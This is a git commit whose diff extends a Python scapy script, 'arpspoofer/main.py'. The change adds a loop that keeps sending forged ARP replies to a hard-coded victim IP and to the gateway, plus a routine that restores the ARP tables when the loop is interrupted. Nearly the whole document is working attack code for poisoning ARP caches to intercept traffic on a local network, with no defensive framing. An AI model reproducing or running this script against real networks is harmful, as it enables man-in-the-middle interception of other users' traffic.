df7ce4f2043c4a4434f1e0f81e1bfd43506c9859
zctrans <zocwu113@gmail.com>
2022-12-19 20:42:48 +0300

    latest

--- arpspoofer/main.py
+++ arpspoofer/main.py
@@ -1,13 +1,19 @@
 import scapy.all as scapy
 import argparse
+from time import sleep
+
 
 def get_mac_by_ip(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
-    arp_request_broadcast = broadcast / arp_request
+    while True:
+     try:
+      arp_request = scapy.ARP(pdst=ip)
+      broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+      arp_request_broadcast = broadcast / arp_request
     
-    ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    return ans[0][1].hwsrc
+      ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+      return ans[0][1].hwsrc
+     except IndexError:
+      continue
 
 
 def spoof(target_ip, spoof_ip):
@@ -18,8 +24,38 @@ def spoof(target_ip, spoof_ip):
         hwdst=target_mac,
         psrc=spoof_ip
     )
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
+def restore(dest_ip, source_ip):
+    package = scapy.ARP(
+        op=2,
+        pdst=dest_ip,
+        hwdst=get_mac_by_ip(dest_ip),
+        psrc=source_ip,
+        hwsrc=get_mac_by_ip(source_ip)
+    )
+    scapy.send(package, count=4, verbose=False)
+
+
+
+def spoof_loop(target_ip, gateway_ip):
+    try:
+        sent_packages_count = 0
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+
+            sent_packages_count = sent_packages_count + 2
+            print(f"\rPackages sent: {sent_packages_count}", end='')
+            sleep(2)
+    except KeyboardInterrupt:
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+        print("\n\nAborted by keyboard. Restoring arp-tables..")
+
+target_ip = '192.168.1.65'
+gateway_ip = '192.168.1.1'
+spoof_loop(target_ip, gateway_ip)
 
 
 # argparser = argparse.ArgumentParser()
@@ -28,7 +64,8 @@ def spoof(target_ip, spoof_ip):
 # argparser.add_argument('-ri', type=str, dest='ri', help='IP of route') # route ip
 # args = argparser.parse_args()
 
-# spoof(args.ti, args.tm, args.ri)
+# spoof('192.168.1.65', '192.168.1.1')
+# spoof('192.168.1.1', '192.168.1.65')
 
 
 
